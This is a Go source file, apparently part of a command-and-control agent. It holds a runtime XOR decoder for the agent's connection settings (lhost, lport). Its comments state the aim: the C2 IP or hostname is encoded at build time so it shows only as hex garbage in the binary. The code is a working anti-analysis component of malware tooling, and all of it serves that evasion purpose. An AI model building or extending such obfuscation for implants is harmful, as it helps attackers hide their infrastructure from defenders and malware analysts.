package main

// obfuscate.go — runtime XOR string deobfuscation for the agent binary.
//
// When 'generate --obfuscate' is used, the server-side generator:
//  1. Generates a random 16-byte XOR key.
//  2. XOR-encodes each sensitive config string (lhost, lport, etc.).
//  3. Passes the encoded values and key as hex strings via -ldflags.
//  4. Clears the plain vars (e.g. -X main.lhost=) so only encoded data remains.
//
// At runtime the agent decodes each value before use.  Strings in the binary
// appear as hex garbage rather than a literal C2 IP/hostname.

import "encoding/hex"

// xorDecode decodes a hex-encoded XOR-encrypted string using a hex-encoded key.
// Returns an empty string if either argument is empty or contains invalid hex.
func xorDecode(hexEncoded, hexKey string) string {
	enc, err := hex.DecodeString(hexEncoded)
	if err != nil || len(enc) == 0 {
		return ""
	}
	key, err := hex.DecodeString(hexKey)
	if err != nil || len(key) == 0 {
		return ""
	}
	for i := range enc {
		enc[i] ^= key[i%len(key)]
	}
	return string(enc)
}

// resolveVar returns the XOR-decoded value when an enc variant and key are
// present, otherwise falls back to the plain text variable.
// Used to transparently support both obfuscated and plain builds.
func resolveVar(plain, enc, key string) string {
	if enc != "" && key != "" {
		return xorDecode(enc, key)
	}
	return plain
}
